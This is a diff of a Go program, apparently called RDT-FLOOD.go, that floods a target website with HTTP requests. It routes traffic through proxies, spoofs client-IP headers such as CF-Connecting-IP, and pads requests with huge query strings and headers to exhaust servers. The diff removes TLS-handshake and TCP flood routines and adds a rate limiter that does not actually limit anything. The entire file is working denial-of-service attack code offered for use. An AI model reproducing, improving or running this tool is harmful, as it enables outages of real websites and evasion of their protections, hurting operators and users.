@@ -22,12 +22,11 @@ import (
 )
 
 const (
-	wrk         = 1500
-	to          = 5 * time.Second
-	sub         = 2
-	KEEP_ALIVE  = 60 * time.Second
-	TLS_WORKERS = 500
-	TCP_WORKERS = 300
+	wrk        = 1500
+	to         = 5 * time.Second
+	sub        = 50
+	RPS_CONTROL = 300
+	KEEP_ALIVE = 60 * time.Second
 )
 
 var UA = []string{
@@ -187,7 +186,7 @@ func RNP() string {
 	return PATH[rand.Intn(len(PATH))]
 }
 
-var customCookie string = ""
+var Cookie_Costum string = ""
 
 func GTV(rawURL string) []string {
 	u, err := url.Parse(rawURL)
@@ -300,6 +299,7 @@ func PWR(ctx context.Context, client *http.Client, jobs <-chan string, results c
 			}
 			req.Header.Set("Referer", REF[rand.Intn(len(REF))]+"query")
 			req.Header.Set("X-Forwarded-For", RIP())
+
 			resp, err := client.Do(req)
 			if err != nil {
 				results <- PRT{url: rawURL, err: err}
@@ -317,6 +317,96 @@ func PWR(ctx context.Context, client *http.Client, jobs <-chan string, results c
 }
 
 func RES(target, cookie string) (string, error) {
+	jar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Timeout: 15 * time.Second,
+		Jar:     jar,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 10 {
+				return fmt.Errorf("too many redirects")
+			}
+			return nil
+		},
+		Transport: &http.Transport{
+			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+			DisableKeepAlives:   false,
+			MaxIdleConns:        100,
+			MaxIdleConnsPerHost: 100,
+			IdleConnTimeout:     10 * time.Second,
+			ForceAttemptHTTP2:   true,
+			ResponseHeaderTimeout: 3 * time.Second,
+		},
+	}
+
+	if cookie != "" {
+		parsedTarget, _ := url.Parse(target)
+		if parsedTarget != nil {
+			cookieMap := map[string]string{}
+			for _, c := range strings.Split(cookie, "; ") {
+				parts := strings.SplitN(c, "=", 2)
+				if len(parts) == 2 {
+					cookieMap[parts[0]] = parts[1]
+				}
+			}
+			var cookies []*http.Cookie
+			for name, value := range cookieMap {
+				cookies = append(cookies, &http.Cookie{
+					Name:   name,
+					Value:  value,
+					Path:   "/",
+					Domain: parsedTarget.Hostname(),
+				})
+			}
+			client.Jar.SetCookies(parsedTarget, cookies)
+		}
+	}
+
+	req, _ := http.NewRequest("GET", target, nil)
+	ua := UA[rand.Intn(len(UA))]
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", ACC[rand.Intn(len(ACC))])
+	req.Header.Set("Accept-Language", LAN[rand.Intn(len(LAN))])
+	req.Header.Set("Accept-Encoding", ENC[rand.Intn(len(ENC))])
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
+		if secChUA, _, _ := HIN(ua); secChUA != "" {
+			req.Header.Set("Sec-Ch-Ua", secChUA)
+			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+			req.Header.Set("Sec-Ch-Ua-Platform", "Windows")
+		}
+	}
+	req.Header.Set("Referer", REF[rand.Intn(len(REF))]+"query")
+	req.Header.Set("X-Forwarded-For", RIP())
+
+	resp, err := client.Do(req)
+	if err == nil {
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK && !ICP(bodyBytes) {
+			return target, nil
+		}
+		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
+			loc, _ := resp.Location()
+			if loc != nil {
+				final := loc.String()
+				req2, _ := http.NewRequest("GET", final, nil)
+				for k, v := range req.Header {
+					req2.Header.Set(k, v[0])
+				}
+				resp2, err2 := client.Do(req2)
+				if err2 == nil {
+					body2, _ := io.ReadAll(resp2.Body)
+					resp2.Body.Close()
+					if resp2.StatusCode == http.StatusOK && !ICP(body2) {
+						return final, nil
+					}
+				}
+			}
+		}
+	}
+
 	variations := GTV(target)
 	commonPaths := []string{"/", "/index.html", "/home", "/main", "/api/health", "/status", "/ping"}
 	extra := []string{}
@@ -350,52 +440,12 @@ func RES(target, cookie string) (string, error) {
 	}
 	variations = unique
 	rand.Shuffle(len(variations), func(i, j int) { variations[i], variations[j] = variations[j], variations[i] })
-	jar, _ := cookiejar.New(nil)
-	client := &http.Client{
-		Timeout: 15 * time.Second,
-		Jar:     jar,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			if len(via) >= 10 {
-				return fmt.Errorf("Too many redirects")
-			}
-			return nil
-		},
-		Transport: &http.Transport{
-			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-			DisableKeepAlives:     false,
-			MaxIdleConns:          100,
-			MaxIdleConnsPerHost:   100,
-			IdleConnTimeout:       10 * time.Second,
-			ForceAttemptHTTP2:     true,
-			ResponseHeaderTimeout: 3 * time.Second,
-		},
-	}
-	if cookie != "" {
-		parsedTarget, _ := url.Parse(target)
-		if parsedTarget != nil {
-			cookieMap := map[string]string{}
-			for _, c := range strings.Split(cookie, "; ") {
-				parts := strings.SplitN(c, "=", 2)
-				if len(parts) == 2 {
-					cookieMap[parts[0]] = parts[1]
-				}
-			}
-			var cookies []*http.Cookie
-			for name, value := range cookieMap {
-				cookies = append(cookies, &http.Cookie{
-					Name:   name,
-					Value:  value,
-					Path:   "/",
-					Domain: parsedTarget.Hostname(),
-				})
-			}
-			client.Jar.SetCookies(parsedTarget, cookies)
-		}
-	}
+
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 	jobs := make(chan string, len(variations))
 	results := make(chan PRT, len(variations))
+
 	numWorkers := 10
 	var wg sync.WaitGroup
 	for i := 0; i < numWorkers; i++ {
@@ -405,14 +455,17 @@ func RES(target, cookie string) (string, error) {
 			PWR(ctx, client, jobs, results)
 		}()
 	}
+
 	for _, v := range variations {
 		jobs <- v
 	}
 	close(jobs)
+
 	go func() {
 		wg.Wait()
 		close(results)
 	}()
+
 	var lastErr error
 	for res := range results {
 		if res.err == nil && res.code == http.StatusOK {
@@ -454,128 +507,12 @@ func RWR(client *http.Client, req *http.Request, maxRedirects int) (*http.Respon
 		newReq.Header = currentReq.Header.Clone()
 		currentReq = newReq
 	}
-	return resp, fmt.Errorf("Too many redirect %d", maxRedirects)
-}
-
-func tlsHandshakeFlood(ctx context.Context, host string, port string, proxies []*url.URL) {
-	var wg sync.WaitGroup
-	for i := 0; i < TLS_WORKERS; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for ctx.Err() == nil {
-				var dialer net.Dialer
-				dialer.Timeout = 2 * time.Second
-				var conn net.Conn
-				var err error
-				if len(proxies) > 0 && proxies[0] != nil {
-					proxy := proxies[rand.Intn(len(proxies))]
-					proxyAddr := proxy.Host
-					if proxy.Scheme == "http" || proxy.Scheme == "https" {
-						conn, err = dialer.DialContext(ctx, "tcp", proxyAddr)
-						if err == nil {
-							connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
-							_, err = conn.Write([]byte(connectReq))
-							if err == nil {
-								buf := make([]byte, 1024)
-								n, _ := conn.Read(buf)
-								if n > 0 && strings.Contains(string(buf[:n]), "200") {
-								} else {
-									conn.Close()
-									continue
-								}
-							} else {
-								conn.Close()
-								continue
-							}
-						}
-					}
-				} else {
-					conn, err = dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
-				}
-				if err != nil {
-					continue
-				}
-				cipherSuites := []uint16{
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-					tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-					tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
-				}
-				rand.Shuffle(len(cipherSuites), func(i, j int) { cipherSuites[i], cipherSuites[j] = cipherSuites[j], cipherSuites[i] })
-				selected := cipherSuites[:rand.Intn(4)+4]
-				tlsConfig := &tls.Config{
-					InsecureSkipVerify: true,
-					ServerName:         host,
-					MinVersion:         tls.VersionTLS12,
-					MaxVersion:         tls.VersionTLS13,
-					CipherSuites:       selected,
-					NextProtos:         []string{"h2", "http/1.1"},
-				}
-				tlsConn := tls.Client(conn, tlsConfig)
-				tlsConn.SetDeadline(time.Now().Add(3 * time.Second))
-				err = tlsConn.Handshake()
-				if err == nil {
-					tlsConn.Close()
-				} else {
-					conn.Close()
-				}
-			}
-		}()
-	}
-	wg.Wait()
-}
-
-func tcpFlood(ctx context.Context, host string, port string, proxies []*url.URL) {
-	var wg sync.WaitGroup
-	for i := 0; i < TCP_WORKERS; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for ctx.Err() == nil {
-				var dialer net.Dialer
-				dialer.Timeout = 1 * time.Second
-				var conn net.Conn
-				var err error
-				if len(proxies) > 0 && proxies[0] != nil {
-					proxy := proxies[rand.Intn(len(proxies))]
-					proxyAddr := proxy.Host
-					conn, err = dialer.DialContext(ctx, "tcp", proxyAddr)
-					if err == nil {
-						connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
-						conn.Write([]byte(connectReq))
-						conn.SetReadDeadline(time.Now().Add(1 * time.Second))
-						buf := make([]byte, 128)
-						n, _ := conn.Read(buf)
-						if n > 0 && strings.Contains(string(buf[:n]), "200") {
-						}
-						conn.Close()
-					}
-				} else {
-					conn, err = dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
-					if err == nil {
-						conn.Close()
-					}
-				}
-			}
-		}()
-	}
-	wg.Wait()
+	return resp, fmt.Errorf("Redirect : %d", maxRedirects)
 }
 
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Println("Cara make nya : <name file> <target> <duration> <cookie>")
+		fmt.Println("Tutor Running : <RDT-FLOOD.go> <target> <duration> <cookie>")
 		os.Exit(1)
 	}
 	tgt := os.Args[1]
@@ -586,32 +523,28 @@ func main() {
 		}
 	}
 	if len(os.Args) >= 4 {
-		customCookie = os.Args[3]
+		Cookie_Costum = os.Args[3]
 	}
-	finalURL, err := RES(tgt, customCookie)
+	Link, err := RES(tgt, Cookie_Costum)
+
 	if err != nil {
 		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 		fmt.Printf("ޗ | Bypass Gagal : %v\n", err)
 		os.Exit(1)
 	}
-	if finalURL != tgt {
+
+	if Link != tgt {
 		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-		fmt.Printf("ޗ | Bypass : %s\n", finalURL)
-		tgt = finalURL
+		fmt.Printf("ޗ | Bypass : %s\n", Link)
+		tgt = Link
 	} else {
 		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-		fmt.Println("ޗ | Bypass : Activated!")
+		fmt.Println("ޗ | Bypass : False!")
 	}
+
 	parsed, _ := url.Parse(tgt)
 	host := parsed.Hostname()
-	port := parsed.Port()
-	if port == "" {
-		if parsed.Scheme == "https" {
-			port = "443"
-		} else {
-			port = "80"
-		}
-	}
+
 	var proxies []*url.URL
 	file, err := os.Open("proxy.txt")
 	if err == nil {
@@ -633,6 +566,7 @@ func main() {
 	if len(proxies) == 0 {
 		proxies = append(proxies, nil)
 	}
+
 	wcs := make([]CLI, len(proxies))
 	for i, PROXYLINK := range proxies {
 		tr := &http.Transport{
@@ -640,11 +574,11 @@ func main() {
 				Timeout:   5 * time.Second,
 				KeepAlive: KEEP_ALIVE,
 			}).DialContext,
-			DisableKeepAlives:      false,
-			MaxIdleConns:           50000,
-			MaxIdleConnsPerHost:    50000,
-			MaxConnsPerHost:        0,
-			IdleConnTimeout:        KEEP_ALIVE,
+			DisableKeepAlives:   false,
+			MaxIdleConns:        50000,
+			MaxIdleConnsPerHost: 50000,
+			MaxConnsPerHost:     0,
+			IdleConnTimeout:     KEEP_ALIVE,
 			TLSClientConfig: &tls.Config{
 				InsecureSkipVerify: true,
 				MinVersion:         tls.VersionTLS12,
@@ -682,22 +616,25 @@ func main() {
 	fmt.Printf("ޗ | Target : %s\n", tgt)
 	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
 	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d | %d | %d |\n", wrk, TLS_WORKERS, TCP_WORKERS)
-	if customCookie != "" {
-		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
+	fmt.Printf("ޗ | Conc   : %d\n", wrk)
+	if Cookie_Costum != "" {
+		fmt.Printf("ޗ | Cookie : %s\n", Cookie_Costum[:30])
 	} else {
 		fmt.Printf("ޗ | Cookie : False\n")
 	}
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+
 	ctx, cancel := context.WithCancel(context.Background())
-	defer cancel()
+	var wg sync.WaitGroup
 	if dur > 0 {
 		time.AfterFunc(time.Duration(dur)*time.Second, func() {
 			cancel()
 		})
 	}
-	var wg sync.WaitGroup
-	methods := []string{"GET", "HEAD", "OPTIONS", "TRACE"}
+
+	rateLimiter := time.NewTicker(time.Second / time.Duration(RPS_CONTROL))
+	defer rateLimiter.Stop()
+
 	for i := 0; i < wrk; i++ {
 		wg.Add(1)
 		c := wcs[i%len(wcs)]
@@ -709,7 +646,11 @@ func main() {
 				go func() {
 					defer swg.Done()
 					for ctx.Err() == nil {
-						method := methods[rand.Intn(len(methods))]
+						select {
+						case <-rateLimiter.C:
+						default:
+						}
+
 						param := CBP[rand.Intn(len(CBP))]
 						reqURL := tgt
 						if strings.Contains(reqURL, "?") {
@@ -717,27 +658,40 @@ func main() {
 						} else {
 							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
 						}
-						if rand.Intn(2) == 0 {
-							reqURL += "&big=" + strings.Repeat("x", 2048+rand.Intn(2048))
+						if rand.Intn(3) == 0 {
+							bigSize := 50000 + rand.Intn(50000)
+							reqURL += "&big=" + strings.Repeat("x", bigSize)
 						}
-						if rand.Intn(10) == 0 {
+						if rand.Intn(5) == 0 {
 							reqURL += "&" + RNS(8) + "=" + RNS(12)
 						}
-						req, _ := http.NewRequest(method, reqURL, nil)
-						ua := UA[rand.Intn(len(UA))]
-						if rand.Intn(3) == 0 {
-							ua += strings.Repeat(" ", 1000) + "extra"
+						if rand.Intn(5) == 0 {
+							reqURL += "&_=" + fmt.Sprintf("%x", rand.Int63())
 						}
+
+						req, _ := http.NewRequest("GET", reqURL, nil)
+
+						ua := UA[rand.Intn(len(UA))]
+						ACCept := ACC[rand.Intn(len(ACC))]
+						lang := LAN[rand.Intn(len(LAN))]
+						enc := ENC[rand.Intn(len(ENC))]
+
 						req.Header.Set("User-Agent", ua)
-						req.Header.Set("Accept", ACC[rand.Intn(len(ACC))])
-						req.Header.Set("Accept-Language", LAN[rand.Intn(len(LAN))])
-						req.Header.Set("Accept-Encoding", ENC[rand.Intn(len(ENC))])
+						req.Header.Set("Accept", ACCept)
+						req.Header.Set("Accept-Language", lang)
+						req.Header.Set("Accept-Encoding", enc)
 						req.Header.Set("Connection", "keep-alive")
 						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 						req.Header.Set("Pragma", "no-cache")
 						req.Header.Set("Upgrade-Insecure-Requests", "1")
 						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
 						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
+
+						if rand.Intn(2) == 0 {
+							largeHeaderValue := strings.Repeat("x", 50000+rand.Intn(50000))
+							req.Header.Set("X-Large-Data", largeHeaderValue)
+						}
+
 						if rand.Intn(3) == 0 {
 							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
 						}
@@ -747,34 +701,42 @@ func main() {
 						if rand.Intn(3) == 0 {
 							req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rand.Int63()))
 						}
-						if rand.Intn(2) == 0 {
+						if rand.Intn(5) == 0 {
 							req.Header.Set("X-Real-IP", RIP())
 						}
-						if rand.Intn(2) == 0 {
+						if rand.Intn(5) == 0 {
 							req.Header.Set("CF-Connecting-IP", RIP())
 						}
-						if rand.Intn(2) == 0 {
+						if rand.Intn(5) == 0 {
 							req.Header.Set("CDN-Loop", "cloudflare")
 						}
+						if rand.Intn(3) == 0 {
+							start := rand.Intn(100000)
+							end := start + rand.Intn(50000)
+							req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
+						}
+						if rand.Intn(3) == 0 {
+							req.Header.Set("Content-Length", "0")
+						}
+
 						var cookies []string
-						if customCookie != "" {
-							cookies = append(cookies, customCookie)
+						if Cookie_Costum != "" {
+							cookies = append(cookies, Cookie_Costum)
 						}
 						for _, name := range CKS {
 							if rand.Intn(2) == 0 {
 								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
 							}
 						}
-						if rand.Intn(2) == 0 {
-							cookies = append(cookies, "big="+strings.Repeat("x", 4096))
-						}
 						if len(cookies) > 0 {
 							req.Header.Set("Cookie", strings.Join(cookies, "; "))
 						}
+
 						if rand.Intn(8) != 0 {
 							ref := REF[rand.Intn(len(REF))]
-							req.Header.Set("Referer", ref+host+strings.Repeat("a", 100))
+							req.Header.Set("Referer", ref+host)
 						}
+
 						if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
 							scu, scm, scp := HIN(ua)
 							if scu != "" {
@@ -786,19 +748,16 @@ func main() {
 						req.Header.Set("Sec-Fetch-Site", "none")
 						req.Header.Set("Sec-Fetch-Mode", "navigate")
 						req.Header.Set("Sec-Fetch-Dest", "document")
+
 						PID := cli.ip
 						if PID == "" {
 							PID = RIP()
 						}
-						req.Header.Set("X-Forwarded-For", PID+", "+RIP()+", "+RIP())
+						req.Header.Set("X-Forwarded-For", PID)
 						req.Header.Set("X-Real-IP", PID)
 						req.Header.Set("True-Client-IP", PID)
-						if rand.Intn(5) == 0 {
-							req.Header.Set("X-Forwarded-Proto", "https")
-							req.Header.Set("X-Forwarded-Host", host)
-							req.Header.Set("X-Forwarded-Port", port)
-						}
-						resp, err := RWR(cli.client, req, 3)
+
+						resp, err := RWR(cli.client, req, 10)
 						if err == nil {
 							io.Copy(io.Discard, resp.Body)
 							resp.Body.Close()
@@ -809,12 +768,7 @@ func main() {
 			swg.Wait()
 		}(c)
 	}
-	go func() {
-		tlsHandshakeFlood(ctx, host, port, proxies)
-	}()
-	go func() {
-		tcpFlood(ctx, host, port, proxies)
-	}()
+
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	select {
